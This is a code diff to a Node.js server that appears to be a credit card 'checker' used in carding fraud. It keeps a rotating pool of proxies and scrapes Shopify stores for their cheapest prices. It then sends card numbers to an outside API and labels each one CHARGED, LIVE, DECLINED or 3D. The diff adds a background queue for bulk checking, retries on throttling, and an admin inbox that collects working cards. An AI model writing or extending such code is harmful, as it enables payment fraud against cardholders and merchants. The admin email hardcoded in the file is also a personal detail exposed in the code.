@@ -22,7 +22,8 @@ const db = {
   ],
   proxies: [],
   inbox: [],
-  activity: []
+  activity: [],
+  tasks: {} // Store background tasks per user
 };
 
 // ─── BULLETPROOF PROXY FORMATTER ───
@@ -87,55 +88,34 @@ app.post('/api/check-sites', async (req, res) => {
       let proxyStr = null;
       if (db.proxies.length > 0) proxyStr = db.proxies[Math.floor(Math.random() * db.proxies.length)];
       
-      const options = { timeout: 15000 };
+      const options = { timeout: 8000 };
       if (proxyStr) {
         const formatted = formatProxy(proxyStr);
         if (formatted) options.httpsAgent = new HttpsProxyAgent(formatted);
       }
 
       let cheapestPrice = 'N/A';
-      let currency = '';
+      let currency = 'USD';
 
       try {
         const prodRes = await axios.get(`https://${domain}/products.json?limit=250`, options);
-        if (prodRes.status === 200 && prodRes.data && Array.isArray(prodRes.data.products) && prodRes.data.products.length > 0) {
-          let minPrice = Infinity;
-          prodRes.data.products.forEach(prod => {
-            if (prod.variants) {
-              prod.variants.forEach(v => {
-                const p = parseFloat(v.price);
-                if (!isNaN(p) && p < minPrice && p > 0) minPrice = p;
-              });
-            }
-          });
-          if (minPrice !== Infinity) {
-            cheapestPrice = minPrice.toFixed(2);
-            try {
-              const homeRes = await axios.get(`https://${domain}`, options);
-              const match = homeRes.data.match(/Shopify\.currency\s*=\s*["']?([A-Z]{3})["']?/);
-              if (match) currency = match[1];
-            } catch(e) {}
+        if (prodRes.status === 200 && prodRes.data && Array.isArray(prodRes.data.products)) {
+          if (prodRes.data.products.length > 0) {
+            let minPrice = Infinity;
+            prodRes.data.products.forEach(prod => {
+              if (prod.variants) {
+                prod.variants.forEach(v => {
+                  const p = parseFloat(v.price);
+                  if (!isNaN(p) && p < minPrice && p > 0) minPrice = p;
+                });
+              }
+            });
+            if (minPrice !== Infinity) cheapestPrice = minPrice.toFixed(2);
           }
-        }
-      } catch (err) {}
-
-      try {
-        const gqlRes = await axios.post(`https://${domain}/api/graphql`, { query: `{ shop { name } }` }, options);
-        if (gqlRes.status === 200 && gqlRes.data) {
           return { domain, price: cheapestPrice, currency };
         }
-      } catch (gqlErr) {
-        try {
-          const homeRes = await axios.get(`https://${domain}`, options);
-          const headers = homeRes.headers;
-          const body = homeRes.data;
-          const isShopify = headers['x-shopid'] !== undefined || headers['x-shopify-stage'] !== undefined || (typeof body === 'string' && (body.includes('cdn.shopify.com') || body.includes('Shopify.theme')));
-          if (homeRes.status === 200 && isShopify) {
-            return { domain, price: cheapestPrice, currency };
-          }
-        } catch (e2) {}
-        return null;
-      }
+      } catch (err) {}
+      return null;
     }));
     
     results.forEach(r => { if (r) liveSites.push(r); });
@@ -173,13 +153,11 @@ app.post('/api/check-proxies', async (req, res) => {
   for (let i = 0; i < proxies.length; i += 20) {
     const batch = proxies.slice(i, i + 20);
     const results = await Promise.all(batch.map(async (p) => {
-      const start = Date.now();
       const formatted = formatProxy(p);
       try {
         const agent = new HttpsProxyAgent(formatted);
-        await axios.get('https://api.ipify.org?format=json', { httpsAgent: agent, timeout: 10000 });
-        if (Date.now() - start <= 10000) return p;
-        return null;
+        await axios.get('https://api.ipify.org?format=json', { httpsAgent: agent, timeout: 8000 });
+        return p;
       } catch (err) { return null; }
     }));
     results.forEach(r => { if (r) liveProxies.push(r); });
@@ -197,16 +175,45 @@ app.delete('/api/proxies', (req, res) => {
   res.json({ success: true, removed: before - db.proxies.length, total: db.proxies.length });
 });
 
-// ─── MAIN CHECKER ───
-app.get('/api/check', async (req, res) => {
-  const { cc } = req.query;
-  if (!cc) return res.status(400).json({ error: 'Missing CC' });
+// ─── BACKGROUND TASK SYSTEM ───
+app.post('/api/start-task', (req, res) => {
+  const { email, cards } = req.body;
+  if (!email || !cards || !cards.length) return res.status(400).json({ error: 'Missing data' });
 
+  if (db.tasks[email] && db.tasks[email].status === 'running') {
+    return res.status(400).json({ error: 'Task already running' });
+  }
+
+  db.tasks[email] = {
+    status: 'running',
+    queue: [...cards],
+    results: [],
+    total: cards.length,
+    checked: 0
+  };
+
+  processUserTask(email); // Run in background
+  res.json({ success: true });
+});
+
+app.get('/api/task-status', (req, res) => {
+  const email = req.query.email;
+  if (!email) return res.status(400).json({ error: 'Missing email' });
+  const task = db.tasks[email];
+  if (!task) return res.json({ active: false });
+  res.json({ active: task.status === 'running', task });
+});
+
+app.post('/api/stop-task', (req, res) => {
+  const { email } = req.body;
+  if (db.tasks[email]) db.tasks[email].status = 'stopped';
+  res.json({ success: true });
+});
+
+// Retry logic for API Throttling
+async function checkCardWithRetry(cc) {
   let attempts = 0;
-  const maxAttempts = db.proxies.length > 0 ? Math.min(3, db.proxies.length) : 1;
-  let lastError = 'No proxies available';
-
-  while (attempts < maxAttempts) {
+  while (attempts < 3) {
     attempts++;
     let proxyStr = null;
     let proxyUrl = null;
@@ -229,41 +236,98 @@ app.get('/api/check', async (req, res) => {
     try {
       const options = { timeout: 20000 };
       if (proxyUrl) options.httpsAgent = new HttpsProxyAgent(proxyUrl);
+      
       const response = await axios.get(targetUrl.toString(), options);
-      return res.json(response.data);
+      const data = response.data;
+      const apiResponse = String(data.Response || data.response || data.status || data.result || '').toUpperCase();
+      
+      // Catch throttled responses and retry
+      if (apiResponse.includes('THROTTLED')) {
+        console.log(`[Throttled] Waiting 2s and retrying ${cc}...`);
+        await new Promise(r => setTimeout(r, 2000));
+        continue; 
+      }
+
+      return { success: true, data };
     } catch (err) {
-      lastError = err.message;
+      console.log(`[Error] ${cc}: ${err.message}. Retrying...`);
       if (proxyStr && (err.code === 'ECONNABORTED' || err.message.includes('connect'))) {
         db.proxies = db.proxies.filter(p => p !== proxyStr);
       }
+      await new Promise(r => setTimeout(r, 1000));
     }
   }
-  res.status(500).json({ status: 'ERROR', message: `Failed. ${lastError}` });
-});
+  return { success: false, error: 'Max retries reached (Throttled/Dead)' };
+}
+
+async function processUserTask(email) {
+  const task = db.tasks[email];
+  
+  while (task.queue.length > 0 && task.status === 'running') {
+    const cc = task.queue.shift();
+    const result = await checkCardWithRetry(cc);
+    
+    if (result.success) {
+      const data = result.data;
+      let apiResponse = String(data.Response || data.response || data.status || data.result || '').toUpperCase();
+      let isSuccess = data.Status === true;
+      let gateway = data.Gateway || '';
+      let price = data.Price || null;
+      
+      let displayLabel = 'UNKNOWN';
+      let uiStatus = 'unknown';
+
+      if (apiResponse.includes('CHARGED') || apiResponse.includes('SUCCESS')) {
+        displayLabel = 'CHARGED'; uiStatus = 'charged';
+      } else if (apiResponse.includes('LIVE') || apiResponse.includes('APPROVED') || apiResponse.includes('INSUFFICIENT') || (isSuccess && apiResponse !== 'CARD_DECLINED')) {
+        displayLabel = 'LIVE'; uiStatus = 'live';
+      } else if (apiResponse.includes('DECLINED') || apiResponse.includes('DEAD') || isSuccess === false) {
+        displayLabel = 'DECLINED'; uiStatus = 'declined';
+      } else if (apiResponse.includes('3DS') || apiResponse.includes('OTP') || apiResponse.includes('AUTHENTICATION')) {
+        displayLabel = '3D'; uiStatus = 'otp';
+      } else if (apiResponse) {
+        displayLabel = apiResponse.substring(0, 12);
+      }
+
+      let message = apiResponse;
+      if (gateway) message = `${gateway} - ${apiResponse}`;
+      if (price) message += ` ($${price})`;
+
+      const entry = {
+        id: Date.now() + Math.random(),
+        cc, status: uiStatus, label: displayLabel, message: message || 'No message', rawJSON: data, time: new Date().toISOString()
+      };
+
+      task.results.push(entry);
+      
+      // Global Activity
+      db.activity.unshift({ user: email, action: 'check', card: cc, result: uiStatus, time: entry.time });
+      if (db.activity.length > 500) db.activity.pop();
+      
+      // Admin Inbox
+      if (uiStatus === 'charged' || uiStatus === 'live') {
+        db.inbox.unshift({ user: email, cc: cc, message: displayLabel, time: entry.time });
+        if (db.inbox.length > 500) db.inbox.pop();
+      }
+    } else {
+      task.results.push({
+        id: Date.now() + Math.random(),
+        cc, status: 'unknown', label: 'ERROR', message: result.error || 'Failed', rawJSON: {}, time: new Date().toISOString()
+      });
+    }
+    
+    task.checked++;
+  }
+  
+  task.status = 'done';
+}
 
 // ─── REPORTING & ACTIVITY (PRIVACY FIX) ───
-app.post('/api/report', (req, res) => {
-  const { user, cc, message } = req.body;
-  db.inbox.unshift({ user, cc, message, time: new Date().toISOString() });
-  res.json({ success: true });
-});
-
-app.post('/api/activity', (req, res) => {
-  const { user, card, result } = req.body;
-  db.activity.unshift({ user, action: 'check', card, result, time: new Date().toISOString() });
-  if (db.activity.length > 500) db.activity.pop();
-  const u = db.users.find(x => x.email === user);
-  if (u) u.checked = (u.checked || 0) + 1;
-  res.json({ success: true });
-});
-
-// Only returns the logged-in user's data, unless they are admin
 app.get('/api/admin/data', (req, res) => {
   const email = req.query.email;
   let inbox = db.inbox;
   let activity = db.activity;
 
-  // If the user requesting is not the admin, filter the logs
   if (email && email !== 'yousafcodes.de@gmail.com') {
     inbox = inbox.filter(i => i.user === email);
     activity = activity.filter(a => a.user === email);
